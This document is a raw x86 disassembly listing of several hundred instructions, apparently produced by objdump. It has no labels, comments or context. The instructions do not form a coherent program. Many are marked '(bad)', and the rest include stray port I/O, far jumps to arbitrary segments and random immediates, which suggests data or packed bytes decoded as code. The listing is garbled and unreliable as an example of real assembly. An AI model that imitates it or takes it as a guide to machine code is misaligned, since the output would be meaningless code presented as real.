  411f07:	push   eax
  411f08:	and    dl,bl
  411f0a:	xchg   ebp,eax
  411f0b:	imul   edx,DWORD PTR [eax-0xd],0x5c
  411f0f:	sti    
  411f10:	adc    dh,dh
  411f12:	push   ebx
  411f13:	push   esi
  411f14:	or     DWORD PTR [esi-0x29679c9f],ebx
  411f1a:	cmp    esi,DWORD PTR [ebx+0x9]
  411f1d:	shl    BYTE PTR [esi],1
  411f1f:	adc    al,0xe5
  411f21:	add    ebp,DWORD PTR [edi+0x43]
  411f24:	and    al,0x5f
  411f26:	mov    WORD PTR [edi-0x32],?
  411f29:	jp     0x411f7f
  411f2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f2c:	sbb    bh,cl
  411f2e:	rol    BYTE PTR [edi+0x78b9757b],1
  411f34:	clc    
  411f35:	cmc    
  411f36:	cmp    eax,0x994801a
  411f3b:	mov    cl,0xc5
  411f3d:	sbb    BYTE PTR [edx-0x45],bh
  411f40:	push   edx
  411f41:	cld    
  411f42:	jl     0x411f4f
  411f44:	or     bh,BYTE PTR [esi+eiz*4]
  411f47:	pop    esp
  411f48:	je     0x411f01
  411f4a:	mov    ebx,0x5e72a0cc
  411f4f:	push   ebp
  411f50:	stos   DWORD PTR es:[edi],eax
  411f51:	cs or  eax,0xce5052f7
  411f57:	out    dx,al
  411f58:	int    0x50
  411f5a:	lods   eax,DWORD PTR ds:[esi]
  411f5b:	out    dx,al
  411f5c:	loopne 0x411f41
  411f5e:	xchg   al,ch
  411f60:	popf   
  411f61:	jmp    0x77e0:0xf31af6a
  411f68:	jnp    0x411fb3
  411f6a:	inc    ebx
  411f6b:	add    ebx,DWORD PTR [esi+0x6107914a]
  411f71:	push   0x182c52a0
  411f76:	mov    DWORD PTR [edx+0x31],0xf9cd7035
  411f7d:	add    al,0x41
  411f7f:	and    edi,DWORD PTR [ebx]
  411f81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f82:	mov    dl,0xca
  411f84:	or     al,0xad
  411f86:	pop    edx
  411f87:	ins    BYTE PTR es:[edi],dx
  411f88:	retf   
  411f89:	xchg   edx,eax
  411f8a:	sbb    esi,DWORD PTR [edi-0x550027fb]
  411f90:	or     BYTE PTR [esi-0x407f7be1],dl
  411f96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f97:	sti    
  411f98:	fwait
  411f99:	sbb    al,0xd6
  411f9b:	std    
  411f9c:	push   eax
  411f9d:	mov    cl,0xdd
  411f9f:	(bad)  
  411fa0:	lods   eax,DWORD PTR ds:[esi]
  411fa1:	xchg   esi,eax
  411fa2:	and    cl,BYTE PTR [ebx-0x35c30c0f]
  411fa8:	fwait
  411fa9:	in     al,dx
  411faa:	out    dx,al
  411fab:	js     0x411fad
  411fad:	inc    esi
  411fae:	loopne 0x41202a
  411fb0:	cdq    
  411fb1:	sub    eax,0x395f78c6
  411fb6:	pop    esi
  411fb7:	ds dec edx
  411fb9:	fmul   DWORD PTR [ecx-0x27]
  411fbc:	fwait
  411fbd:	mov    esp,0x76139377
  411fc2:	pop    edx
  411fc3:	pop    edx
  411fc4:	or     esi,edx
  411fc6:	mov    bh,0x70
  411fc8:	fild   WORD PTR [ebx-0x71a788f9]
  411fce:	mov    gs,WORD PTR [edi]
  411fd0:	sbb    al,0x9
  411fd2:	sbb    al,0x4a
  411fd4:	adc    eax,0x2fe8aeb4
  411fd9:	shl    DWORD PTR [edi-0x44f830b7],0x68
  411fe0:	fsubr  DWORD PTR [edi]
  411fe2:	mov    esp,0xe5bf12e2
  411fe7:	icebp  
  411fe8:	es push esp
  411fea:	mov    ch,0xb2
  411fec:	je     0x411fb6
  411fee:	cs jle 0x412009
  411ff1:	cmp    BYTE PTR [eax],dh
  411ff3:	ret    0x93cc
  411ff6:	mov    edx,0x2ce8a6e6
  411ffb:	mov    BYTE PTR [edx],dl
  411ffd:	nop
  411ffe:	in     eax,0x64
  412000:	call   0x952880e3
  412005:	and    al,0x41
  412007:	mov    eax,ds:0x26536e0c
  41200c:	mov    eax,0x78cff01e
  412011:	push   ss
  412012:	push   cs
  412013:	retf   0xd472
  412016:	retf   
  412017:	es cmp esp,ebx
  41201a:	(bad)  
  41201b:	mov    cl,0x36
  41201d:	ret    
  41201e:	ret    0xc568
  412021:	xchg   esp,eax
  412022:	ror    BYTE PTR [esi-0x65],1
  412025:	ret    
  412026:	sbb    al,0x97
  412028:	sub    BYTE PTR [ebx-0x7bfed88f],dh
  41202e:	jnp    0x411fdb
  412030:	repz dec edx
  412032:	int    0xae
  412034:	jo     0x4120ac
  412036:	xchg   DWORD PTR [ebp+eax*4-0x39],ebp
  41203a:	enter  0xa0c3,0x58
  41203e:	scas   eax,DWORD PTR es:[edi]
  41203f:	sbb    ecx,edx
  412041:	in     al,dx
  412042:	leave  
  412043:	sar    DWORD PTR [ebx+0x5fd52369],cl
  412049:	ins    DWORD PTR es:[edi],dx
  41204a:	adc    al,0x75
  41204c:	jne    0x412077
  41204e:	shl    DWORD PTR [ecx+esi*4-0x1f],cl
  412052:	cwde   
  412053:	fnsave [ebx+0x2b]
  412056:	mov    ds:0x78af16e5,al
  41205b:	cwde   
  41205c:	xchg   ecx,eax
  41205d:	(bad)  [esi-0x73]
  412060:	add    ebp,DWORD PTR [esi-0xb4fa5dc]
  412066:	outs   dx,BYTE PTR ds:[esi]
  412067:	retf   
  412068:	mov    edx,ss
  41206a:	dec    esp
  41206b:	sbb    al,0xd
  41206d:	(bad)  
  41206e:	mov    ebp,0x375677c8
  412073:	cmp    BYTE PTR [esi+eiz*8+0x2e698fd1],ah
  41207a:	and    DWORD PTR [edx-0x3cda60fc],0xffffffa2
  412081:	jle    0x4120f6
  412083:	(bad)
  412088:	xor    eax,0x2b0fab93
  41208d:	sbb    ecx,ebx
  41208f:	push   esi
  412090:	sbb    BYTE PTR [eax-0xe5ad8b4],bl
  412096:	or     al,0xc
  412098:	sbb    eax,0x2638c3c
  41209d:	sbb    ecx,DWORD PTR [esi+ebp*2+0x24017d59]
  4120a4:	lock int3 
  4120a6:	stos   DWORD PTR es:[edi],eax
  4120a7:	mov    al,0x63
  4120a9:	mov    edi,gs
  4120ab:	jns    0x412032
  4120ad:	stos   BYTE PTR es:[edi],al
  4120ae:	inc    eax
  4120af:	mov    esp,0x6f9472a
  4120b4:	leave  
  4120b5:	xor    DWORD PTR [esi-0x3e30661e],ecx
  4120bb:	popa   
  4120bc:	mov    ah,0x64
  4120be:	mov    edi,0x3d262753
  4120c3:	scas   eax,DWORD PTR es:[edi]
  4120c4:	and    BYTE PTR [esi+0x7da55917],al
  4120ca:	or     BYTE PTR [eax],0x5d
  4120cd:	push   ecx
  4120ce:	call   0x359ac088
  4120d3:	repz dec eax
  4120d5:	adc    DWORD PTR [ebp-0x55],edi
  4120d8:	jp     0x412132
  4120da:	and    esi,DWORD PTR [ebp+0x3fb46ebe]
  4120e0:	push   ebx
  4120e1:	arpl   WORD PTR [edi+0x4e38937b],dx
  4120e7:	mov    cl,0xac
  4120e9:	out    0xab,eax
  4120eb:	push   es
  4120ec:	test   DWORD PTR [ebx+eiz*8-0x59f97625],edi
  4120f3:	or     eax,0x5afca8b2
  4120f8:	aad    0xfb
  4120fa:	mov    ah,0xc9
  4120fc:	jp     0x412132
  4120fe:	push   ebx
  4120ff:	xchg   edi,eax
  412100:	fild   WORD PTR [esi-0x63]
  412103:	xor    BYTE PTR [ecx],ah
  412105:	xchg   DWORD PTR [eax-0x1e333b2e],esp
  41210b:	scas   al,BYTE PTR es:[edi]
  41210c:	xchg   esi,eax
  41210d:	ins    BYTE PTR es:[edi],dx
  41210e:	repnz inc ebp
  412110:	loop   0x412160
  412112:	test   ch,0x82
  412115:	mov    dh,BYTE PTR [eax-0x4d]
  412118:	stos   DWORD PTR es:[edi],eax
  412119:	cdq    
  41211a:	add    BYTE PTR [eax],ch
  41211c:	bound  cx,DWORD PTR [ebx+0x17]
  412120:	data16 int3 
  412122:	and    dh,cl
  412124:	push   esi
  412125:	sti    
  412126:	xchg   ebp,eax
  412127:	jmp    0xa024d224
  41212c:	cmp    eax,DWORD PTR [edx-0x10292b20]
  412132:	jl     0x412177
  412134:	inc    esi
  412135:	es push eax
  412137:	mov    edi,0xc3546466
  41213c:	mov    DWORD PTR [ecx],ebp
  41213e:	(bad)  [edx]
  412140:	call   0xd20db532
  412145:	das    
  412146:	outs   dx,DWORD PTR ds:[esi]
  412147:	cmp    DWORD PTR [edx+0x39530770],ebx
  41214d:	add    dl,0x56
  412150:	sbb    BYTE PTR [eiz*8-0x558fc859],ah
  412157:	lock jl 0x4121af
  41215a:	sub    BYTE PTR [ecx-0x4f247524],bl
  412160:	dec    esi
  412161:	push   esp
  412162:	aas    
  412163:	adc    BYTE PTR [esi+0x6d],dl
  412166:	or     dl,ah
  412168:	cs test eax,0xb6961e4c
  41216e:	push   esp
  41216f:	ds pop es
  412171:	cmc    
  412172:	rcr    BYTE PTR ds:0x5c06a678,0x59
  412179:	mov    ebp,0x2601da0c
  41217e:	addr16 pop ds
  412180:	jb     0x412191
  412182:	push   ds
  412183:	outs   dx,BYTE PTR ds:[esi]
  412184:	adc    al,0x6e
  412186:	or     DWORD PTR [ecx],ebp
  412188:	adc    BYTE PTR [ecx-0x5bd1c181],al
  41218e:	and    DWORD PTR [esi*4+0x2fdf3285],0x209ab2e
  412199:	jae    0x4121b1
  41219b:	test   bh,al
  41219d:	hlt    
  41219e:	jg     0x412129
  4121a0:	cld    
  4121a1:	cwde   
  4121a2:	aam    0x83
  4121a4:	cmp    dh,BYTE PTR ds:0xecd2c6cc
  4121aa:	dec    ebx
  4121ab:	mov    cl,0x2e
  4121ad:	jbe    0x4121fc
  4121af:	pop    ss
  4121b0:	(bad)  
  4121b2:	std    
  4121b3:	(bad)  
  4121b4:	push   ecx
  4121b5:	in     eax,dx
  4121b6:	adc    dl,BYTE PTR [ebx]
  4121b8:	or     esi,esi
  4121ba:	ror    DWORD PTR [eax-0xf61d6c3],1
  4121c0:	imul   eax,DWORD PTR [esi+0x279ac5fe],0x44470e04
  4121ca:	jmp    0x412159
  4121cc:	mov    dh,0xa2
  4121ce:	das    
  4121cf:	adc    dl,dl
  4121d1:	test   eax,0x332c73b5
  4121d6:	mov    bh,0xd1
  4121d8:	mov    ebp,0x63a1885a
  4121dd:	rol    DWORD PTR [ebx+0x12],cl
  4121e0:	repz jmp 0x7a394d57
  4121e6:	stos   BYTE PTR es:[edi],al
  4121e7:	adc    BYTE PTR [ebx+ebx*1],bl
  4121ea:	add    al,BYTE PTR [edx]
  4121ec:	leave  
  4121ed:	jmp    0x6716:0x75ea5b79
  4121f4:	push   esi
  4121f5:	out    0x6a,eax
  4121f7:	hlt    
  4121f8:	cmp    dh,dh
  4121fa:	add    ebx,DWORD PTR ds:0xc08eab84
  412200:	inc    DWORD PTR [ebp-0x47]
  412203:	mov    DWORD PTR ds:0x268ec727,edx
  412209:	mov    eax,ds:0x82b38589
  41220e:	outs   dx,DWORD PTR ds:[esi]
  41220f:	xchg   edi,eax
  412210:	shr    BYTE PTR [edx],cl
  412212:	imul   ecx,edx,0xffffffbc
  412215:	or     al,0xa2
  412217:	and    edi,DWORD PTR [eax+0x4c]
  41221a:	test   al,0x7e
  41221c:	inc    ebx
  41221d:	add    DWORD PTR [eax-0x7a],esp
  412220:	jno    0x412297
  412222:	jb     0x412208
  412224:	xchg   ebx,eax
  412225:	xlat   BYTE PTR ds:[ebx]
  412226:	in     al,0x70
  412228:	fidivr WORD PTR [esi+0x70]
  41222b:	jp     0x4121df
  41222d:	ds (bad) 
  41222f:	mov    fs,eax
  412231:	inc    BYTE PTR ss:[eax+0x22ca383c]
  412238:	fstp   TBYTE PTR [ebx]
  41223a:	sbb    eax,0x44537609
  41223f:	dec    ecx
  412240:	cmp    eax,0xca613527
  412245:	(bad)  
  412246:	adc    BYTE PTR ds:0x8ccaef2e,ch
  41224c:	jg     0x412298
  41224e:	add    BYTE PTR [edi+edx*8+0x704bc4df],dl
  412255:	xchg   ecx,eax
  412256:	stc    
  412257:	cli    
  412258:	push   ebp
  412259:	data16 jge 0x4122a0
  41225c:	dec    edi
  41225d:	or     al,0x5a
  41225f:	js     0x4122b8
  412261:	sbb    al,0x7a
  412263:	leave  
  412264:	lea    ecx,[eax]
  412266:	xchg   BYTE PTR [eax],dh
  412268:	push   ebp
  412269:	fld    st(0)
  41226b:	test   BYTE PTR [esi-0x64530d3d],al
  412271:	int    0x66
  412273:	les    edx,FWORD PTR [ebp+0x51]
  412276:	inc    ecx
  412277:	xchg   ecx,eax
  412278:	jg     0x4122da
  41227a:	(bad)  
  41227b:	ficomp WORD PTR [ecx+ebx*1]
  41227e:	int    0x66
  412280:	test   dh,bl
  412282:	add    ah,BYTE PTR [esi+esi*8+0x41]
  412286:	or     dh,BYTE PTR [edi-0x2efa6cf5]
  41228c:	(bad)  
  41228d:	lods   eax,DWORD PTR ds:[esi]
  41228e:	in     eax,0xce
  412290:	mov    edi,0x133582bf
  412295:	ret    0xda44
  412298:	pop    ss
  412299:	sub    ah,dl
  41229b:	popf   
  41229c:	(bad)  
  41229d:	cwde   
  41229e:	lahf   
  41229f:	dec    eax
  4122a0:	push   ebp
  4122a1:	sbb    BYTE PTR [ebp+0x6a],0x55
  4122a5:	add    DWORD PTR [eax-0x1b],ecx
  4122a8:	jecxz  0x4122e2
  4122aa:	dec    eax
  4122ab:	into   
  4122ac:	xor    eax,eax
  4122ae:	cmp    eax,0x6ae5011a
  4122b3:	icebp  
  4122b4:	adc    ebx,DWORD PTR [ebp+edx*1+0x41f2f670]
  4122bb:	loop   0x4122bd
  4122bd:	repz arpl bp,sp
  4122c0:	add    ebp,DWORD PTR ds:0x7020f3
  4122c6:	ds inc ebp
  4122c8:	retf   0x6425
  4122cb:	lods   al,BYTE PTR ds:[esi]
  4122cc:	dec    edi
  4122cd:	gs cmp eax,0xe361df88
  4122d3:	int    0x5d
  4122d5:	int    0xda
  4122d7:	pushf  
  4122d8:	inc    eax
  4122d9:	inc    ecx
  4122da:	mov    ebp,0xd5df4759
  4122df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122e0:	(bad)  
  4122e1:	icebp  
  4122e2:	inc    ecx
  4122e3:	jecxz  0x4122a9
  4122e5:	jle    0x4122db
  4122e7:	pop    edi
  4122e8:	js     0x4122d0
  4122ea:	test   al,0xb2
  4122ec:	pop    ebx
  4122ed:	sahf   
  4122ee:	mov    edx,0x276ca477
  4122f3:	popf   
  4122f4:	xor    eax,0xe90a7515
  4122f9:	xchg   esi,eax
  4122fa:	sub    al,0x39
  4122fc:	in     eax,dx
  4122fd:	(bad)  
  4122fe:	imul   edx,DWORD PTR [edi-0x4c],0x12e136df
  412305:	out    dx,al
  412306:	fistp  WORD PTR [ebp-0x69]
  412309:	sub    DWORD PTR [edi],ebx
  41230b:	test   BYTE PTR [esi],cl
  41230d:	jmp    0x4122f0
  41230f:	and    edi,edi
  412311:	pop    ds
  412312:	cdq    
  412313:	pop    edx
  412314:	or     ebx,DWORD PTR [eax]
  412316:	jb     0x412306
  412318:	dec    eax
  412319:	jb     0x4122cf
  41231b:	xor    BYTE PTR [edi],bl
  41231d:	out    0x47,al
  41231f:	cmc    
  412320:	jno    0x4122f6
  412322:	jo     0x4122b1
  412324:	(bad)  
  412325:	and    cl,bh
  412327:	test   al,0x5
  412329:	cmp    eax,DWORD PTR [edi+ecx*1]
  41232c:	pop    ebp
  41232d:	ja     0x412322
  41232f:	ins    BYTE PTR es:[edi],dx
  412330:	retf   0x278c
  412333:	add    BYTE PTR [eax],0x1f
  412336:	je     0x412341
  412338:	pop    ss
  412339:	test   BYTE PTR [eax+0x15],ah
  41233c:	test   eax,0x74cdbd52
  412341:	mov    ebx,DWORD PTR [ebp-0x5a0590bb]
  412347:	lahf   
  412348:	mov    al,0x5a
  41234a:	jg     0x412315
  41234c:	mov    dh,BYTE PTR [ecx-0x4050b243]
  412352:	imul   esi,DWORD PTR [edi],0xffffff98
  412355:	bound  ecx,QWORD PTR [esi-0x63]
  412358:	ins    BYTE PTR es:[edi],dx
  412359:	ins    DWORD PTR es:[edi],dx
  41235a:	xlat   BYTE PTR ds:[ebx]
  41235b:	inc    eax
  41235c:	push   ss
  41235d:	push   esi
  41235e:	fnstenv [ebp+0x6f]
  412361:	xchg   ebp,eax
  412362:	jo     0x412377
  412364:	jne    0x41230c
  412366:	xchg   edi,eax
  412367:	lock in eax,dx
  412369:	sar    BYTE PTR [edx+0x74],0x9e
  41236d:	(bad)  
  41236e:	js     0x4123b3
  412370:	out    dx,eax
  412371:	pop    ds
  412372:	dec    edx
  412373:	data16 xchg BYTE PTR [ebx-0x1a3b6231],cl
  41237a:	rep lods al,BYTE PTR ds:[esi]
  41237c:	adc    al,0x24
  41237e:	mov    ecx,0xfcc00e7a
  412383:	inc    ebx
  412384:	gs sbb eax,0xc2f020b4
  41238a:	xchg   ebx,eax
  41238b:	mov    ds:0x138b372d,al
  412390:	mov    al,0x10
  412392:	mov    al,0x9b
  412394:	test   al,0x0
  412396:	adc    al,BYTE PTR [ebp-0x35]
  412399:	in     al,dx
  41239a:	out    dx,eax
  41239b:	icebp  
  41239c:	add    ebp,esi
  41239e:	retf   
  41239f:	push   0x72fcfd
  4123a4:	idiv   BYTE PTR [ebp-0x16]
  4123a7:	int3   
  4123a8:	push   ds
  4123a9:	ror    BYTE PTR [ebp+0x2451b299],cl
  4123af:	pop    eax
  4123b0:	hlt    
  4123b1:	add    ah,BYTE PTR [ebx]
  4123b3:	mov    cl,0xce
  4123b5:	and    BYTE PTR [ecx-0x330c3ff2],0xfc
  4123bc:	or     eax,DWORD PTR [ecx]
  4123be:	dec    edx
  4123bf:	imul   ebx,DWORD PTR [esi+0x23],0xffffffcb
  4123c3:	ret    0x273d
  4123c6:	pop    ss
  4123c7:	(bad)  
  4123c8:	xor    al,0xd8
  4123ca:	arpl   WORD PTR [edx-0x296e3deb],cx
  4123d0:	pop    es
  4123d1:	inc    ebx
  4123d2:	dec    ebp
  4123d3:	das    
  4123d4:	fisttp WORD PTR [esi-0x42]
  4123d7:	cwde   
  4123d8:	loop   0x412367
  4123da:	jp     0x412429
  4123dc:	sbb    dh,bh
  4123de:	mov    ebp,0x180908f6
  4123e3:	sbb    BYTE PTR [ebp-0x73],ah
  4123e6:	jge    0x4123b7
  4123e8:	fxch   st(4)
  4123ea:	sub    eax,DWORD PTR [ecx-0x7b071661]
  4123f0:	mov    al,0xee
  4123f2:	and    al,0x51
  4123f4:	inc    ecx
  4123f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4123f6:	ins    BYTE PTR es:[edi],dx
  4123f7:	(bad)  [eax+0x66]
  4123fa:	iret   
  4123fb:	sub    BYTE PTR [edi+eax*2+0x5d],cl
  4123ff:	outs   dx,DWORD PTR ds:[esi]
  412400:	js     0x412436
  412402:	pop    ds
  412403:	(bad)  
  412404:	pop    ebx
  412405:	test   BYTE PTR [edi],ch
  412407:	inc    ebp
  412408:	cld    
  412409:	(bad)  
  41240a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41240b:	inc    edx
  41240c:	ret    0x951
  41240f:	out    dx,al
  412410:	pop    ecx
  412411:	xor    al,0x8e
  412413:	in     eax,dx
  412414:	inc    esp
  412415:	fld    DWORD PTR [ebx]
  412417:	out    dx,al
  412418:	xchg   ebp,eax
  412419:	xchg   bh,dl
  41241b:	mov    ds:0x121011fa,eax
  412420:	popa   
  412421:	test   BYTE PTR [eax+0x3e],bl
  412424:	xor    ecx,esi
  412426:	push   0xf1a265af
  41242b:	push   0xe572ef52
  412430:	jle    0x412428
  412432:	mov    ds:0xd92f83a5,eax
  412437:	das    
  412438:	and    eax,0x14296c60
  41243d:	xor    edi,DWORD PTR [esi]
  41243f:	push   esi
  412440:	cwde   
  412441:	push   0x93aa11d1
  412446:	loope  0x4123f1
  412448:	ins    DWORD PTR es:[edi],dx
  412449:	leave  
  41244a:	xlat   BYTE PTR ds:[ebx]
  41244b:	xchg   edx,eax
  41244c:	pop    ds
  41244d:	add    al,0xf3
  41244f:	addr16 sti 
  412451:	lods   al,BYTE PTR ds:[esi]
  412452:	push   es
  412453:	adc    ecx,DWORD PTR [eax+ecx*2+0x52]
  412457:	bound  edi,QWORD PTR [edi+eiz*1-0x55ec102e]
  41245e:	sbb    BYTE PTR [edx],0xba
  412461:	sub    DWORD PTR [ebx+0x78fc2d87],esp
  412467:	out    0x74,al
  412469:	jmp    0x4124b7
  41246b:	imul   ebx,DWORD PTR ds:0xdee24b64,0xffffff85
  412472:	popa   
  412473:	fwait
  412474:	addr16 push ds
  412476:	inc    ecx
  412477:	popf   
  412478:	fdiv   QWORD PTR [ebx-0x5]
  41247b:	mov    al,ds:0x448d340f
  412480:	jmp    0xe3b2:0xde5de3b6
  412487:	and    dl,dh
  412489:	hlt    
  41248a:	pop    edi
  41248b:	adc    ecx,esi
  41248d:	xor    eax,0xe2080c1b
  412492:	mov    al,ds:0xd4a6e0fa
  412497:	repz lock imul ebp,DWORD PTR [eax+0x77],0x9a7c29b0
  4124a0:	sub    edi,DWORD PTR [edi]
  4124a2:	inc    esi
  4124a3:	push   ss
  4124a4:	xor    al,0x56
  4124a6:	sbb    bh,ch
  4124a8:	out    0xec,eax
  4124aa:	nop
  4124ab:	and    eax,0x74b4f704
  4124b0:	or     al,0x71
  4124b2:	cld    
  4124b3:	outs   dx,BYTE PTR ds:[esi]
  4124b4:	jns    0x412460
  4124b6:	push   ebx
  4124b7:	lods   eax,DWORD PTR ds:[esi]
  4124b8:	fisub  DWORD PTR [ebx]
  4124ba:	pushf  
  4124bb:	inc    ebp
  4124bc:	sbb    BYTE PTR [eax],0xd8
  4124bf:	test   BYTE PTR [esi+0x755055c3],ch
  4124c5:	test   eax,0x4aa9c2f6
  4124ca:	inc    eax
  4124cb:	xchg   ebx,eax
  4124cc:	mov    cs:0x8c6b0c37,eax
  4124d2:	jmp    0x3fcf:0x38c74341
  4124d9:	(bad)
  4124dc:	lea    ebx,[edx+0x7dfb5f63]
  4124e2:	inc    ecx
  4124e3:	xor    BYTE PTR [eax-0x739e5bc1],bh
  4124e9:	es int 0x49
  4124ec:	jns    0x4124d8
  4124ee:	test   eax,0xd269daa8
  4124f3:	lea    ebx,[esi]
  4124f5:	es jl  0x412559
  4124f8:	aas    
  4124f9:	cli    
  4124fa:	retf   0xf99f
  4124fd:	inc    ebp
  4124fe:	inc    ecx
  4124ff:	and    ebp,DWORD PTR [edi]
  412501:	test   BYTE PTR ds:0x661780ff,bh
  412507:	clc    
  412508:	adc    BYTE PTR [bp-0x29],dl
  41250c:	dec    edx
  41250d:	(bad)  
  41250e:	pusha  
  41250f:	xchg   ebp,eax
  412510:	lea    esp,[edx+0x6e0c4e44]
  412516:	mov    bl,0x8a
  412518:	lahf   
  412519:	mov    ebx,0xbf3c862
  41251e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41251f:	sbb    al,0x79
  412521:	loope  0x412545
  412523:	add    dl,0x50
  412526:	int3   
  412527:	mov    al,ds:0x703cca98
  41252c:	into   
  41252d:	push   edi
  41252e:	std    
  41252f:	jb     0x412565
  412531:	out    0xa3,al
  412533:	push   ebp
  412534:	(bad)  
  412536:	out    0x74,al
  412538:	int3   
  412539:	leave  
  41253a:	dec    ecx
  41253b:	mov    ds:0x72545af5,eax
  412540:	mov    ds:0x13288337,al
  412545:	inc    ecx
  412546:	mov    bh,0xef
  412548:	mov    esp,0xfb54c5ba
  41254d:	add    eax,0x5302eb37
  412552:	adc    DWORD PTR [edx],esp
  412554:	ds xchg edx,eax
  412556:	(bad)  
  412557:	fsubp  st(5),st
  412559:	mov    fs,WORD PTR [ebx]
  41255b:	data16 lahf 
  41255d:	lock mov edi,0xb148566b
  412563:	aam    0xd9
  412565:	sar    BYTE PTR [esi],cl
  412567:	pop    eax
  412568:	jae    0x41250b
  41256a:	push   esi
  41256b:	xlat   BYTE PTR ds:[ebx]
  41256c:	inc    ecx
  41256d:	out    dx,al
  41256e:	dec    edi
  41256f:	sar    DWORD PTR ds:0xb90b5579,0xd5
  412576:	int3   
  412577:	ins    BYTE PTR es:[edi],dx
  412578:	das    
  412579:	jp     0x412531
  41257b:	mov    ebp,0xc89fbd98
  412580:	xchg   DWORD PTR [ecx+0x6adc6d06],edi
  412586:	or     al,0x60
  412588:	int    0x46
  41258a:	and    BYTE PTR [esi+0x5aaa6e2d],bl
  412590:	sub    al,0xc4
  412592:	pop    ss
  412593:	push   esi
  412594:	push   edx
  412595:	push   es
  412596:	xchg   edx,eax
  412597:	aas    
  412598:	test   BYTE PTR [ebp+0x1dc550c8],0xb7
  41259f:	xlat   BYTE PTR ds:[ebx]
  4125a0:	lods   al,BYTE PTR ds:[esi]
  4125a1:	push   edx
  4125a2:	out    0x1,al
  4125a4:	shr    DWORD PTR [ebp-0x27],0x76
  4125a8:	leave  
  4125a9:	cwde   
  4125aa:	adc    bl,al
  4125ac:	fstp   TBYTE PTR [edx]
  4125ae:	jo     0x412627
  4125b0:	(bad)  
  4125b1:	push   esi
  4125b2:	sub    dl,BYTE PTR [eax]
  4125b4:	inc    esp
  4125b5:	sub    cl,BYTE PTR [esi]
  4125b7:	sbb    cl,BYTE PTR [edi]
  4125b9:	mov    bl,0x33
  4125bb:	fldenv [eax+0x591b88dd]
  4125c1:	pop    ecx
  4125c2:	ret    0x7b9f
  4125c5:	or     cl,0x4a
  4125c8:	mov    bl,0xde
  4125ca:	xor    DWORD PTR [esi-0x17d85114],ebp
  4125d0:	and    DWORD PTR [ecx-0x79],ecx
  4125d3:	in     al,dx
  4125d4:	mov    ds:0x162b2031,al
  4125d9:	mov    ds,WORD PTR [ecx+0x17]
  4125dc:	pop    ebx
  4125dd:	mov    bl,BYTE PTR [ebp+0x1beefbec]
  4125e3:	add    al,0x3a
  4125e5:	(bad)  
  4125e6:	and    al,cl
  4125e8:	xor    DWORD PTR [esi-0x34dc36c4],0xffffff9e
  4125ef:	xchg   esp,eax
  4125f0:	xchg   DWORD PTR [edi-0x236c8d97],ecx
  4125f6:	mov    ds:0xbf536102,eax
  4125fb:	jge    0x41264e
  4125fd:	adc    esi,DWORD PTR [ebx+ebx*4+0x1a]
  412601:	popf   
  412602:	mov    cl,0x44
  412605:	pop    edi
  412606:	loop   0x4125eb
  412608:	mov    ebp,0x3fa5e37
  41260d:	lods   eax,DWORD PTR ds:[esi]
  41260e:	mov    edi,DWORD PTR [eax]
  412610:	xchg   ebp,eax
  412611:	mov    bh,BYTE PTR [edx]
  412613:	jno    0x41267a
  412615:	(bad)  
  412617:	test   al,0xe7
  412619:	inc    edx
  41261a:	add    DWORD PTR [eax+0x1b],edi
  41261d:	push   esp
  41261e:	fisub  DWORD PTR [ebx+0x59]
  412621:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412622:	dec    ecx
  412623:	dec    ebp
  412624:	adc    eax,0x14dcc325
  412629:	jb     0x4125f1
  41262b:	cdq    
  41262c:	cmc    
  41262d:	jnp    0x4125ec
  41262f:	mov    ah,0xf
  412631:	push   cs
  412632:	repnz or BYTE PTR [eax+0x73],bh
  412636:	iret   
  412637:	jmp    0x66d6f520
  41263c:	ficom  DWORD PTR [edi+0x2235038a]
  412642:	stos   DWORD PTR es:[edi],eax
  412643:	adc    ecx,DWORD PTR [edx+0x64a77f5b]
  412649:	jmp    0x10a5:0x7c6fc9d0
  412650:	and    ch,BYTE PTR [ebp+0x22]
  412653:	sbb    al,0x62
  412655:	xchg   edi,eax
  412656:	dec    esp
  412657:	xchg   ecx,eax
  412658:	int3   
  412659:	push   es
  41265a:	les    esi,FWORD PTR [ecx+0x61e66d11]
  412660:	or     DWORD PTR fs:[edx+0xf09135],esi
  412667:	sahf   
  412668:	pop    ebx
  412669:	push   edx
  41266a:	fs std 
  41266c:	sub    al,0x74
  41266e:	js     0x41263e
  412670:	xor    al,0xed
  412672:	cwde   
  412673:	clc    
  412674:	xor    DWORD PTR [ecx-0x8b05707],ebx
  41267a:	hlt    
  41267b:	sar    DWORD PTR [ecx-0x41],cl
  41267e:	mov    esp,0xb581a1f5
  412683:	cmp    al,0x5d
  412685:	aad    0xd7
  412687:	jno    0x412663
  412689:	mov    bl,0xdb
  41268b:	pop    ds
  41268c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41268d:	in     eax,dx
  41268e:	enter  0x81ca,0xe5
  412692:	xor    DWORD PTR [ebx-0x5bd62946],ebp
  412698:	mov    dh,0xcd
  41269a:	mov    eax,ds:0x79a5c36a
  41269f:	ds pop ebp
  4126a1:	sub    BYTE PTR [ebx],dl
  4126a3:	sub    edx,DWORD PTR [edi]
  4126a5:	cmp    eax,0xd963bff6
  4126aa:	jnp    0x412661
  4126ac:	cdq    
  4126ad:	or     eax,0x1b22be59
  4126b2:	sub    dh,BYTE PTR [edx-0x66]
  4126b5:	shr    cl,cl
  4126b7:	jbe    0x412642
  4126b9:	mov    al,ds:0xa6588c22
  4126be:	fs dec esi
  4126c0:	jbe    0x412648
  4126c2:	aam    0xb6
  4126c4:	jns    0x4126e4
  4126c6:	lock sar al,1
  4126c9:	retf   
  4126ca:	iret   
  4126cb:	popf   
  4126cc:	mov    bl,0x94
  4126ce:	adc    eax,0x96f98735
  4126d3:	pop    esi
  4126d4:	arpl   WORD PTR [eax-0x76a2f11d],si
  4126da:	pop    ds
  4126db:	popa   
  4126dc:	inc    ecx
  4126dd:	hlt    
  4126de:	mov    esi,0x684fc3e9
  4126e3:	dec    edx
  4126e4:	mov    ah,0x68
  4126e6:	mov    ds:0x37e65ba5,al
  4126eb:	or     BYTE PTR [eax-0x20],cl
